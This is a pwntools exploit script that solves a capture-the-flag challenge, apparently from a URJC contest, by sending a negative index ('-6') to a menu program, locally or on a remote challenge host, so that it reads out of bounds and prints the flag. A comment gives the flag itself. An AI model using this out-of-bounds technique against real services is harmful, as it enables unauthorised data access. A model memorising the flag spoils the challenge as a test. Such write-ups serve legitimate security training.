#!/usr/bin/env python3
# URJC{D0nt_b3_n3g4t1v3}

from pwn import *

exe = context.binary = ELF(args.EXE or 'challenge', checksec = False)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("vulnerable.numa.host", 9993)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

io = start()

io.sendlineafter(b'Salir\n', b'2')
io.sendlineafter(b'agenda.', b'-6')
io.recvline()
output = io.recvline()

if b'URJC' in output:
    success(f"FLAG => {output.strip().split(b'es ')[1].decode()}")
else:
    info(f"Flag not found, try running the exploit with the arg \"REMOTE\"")


io.close()

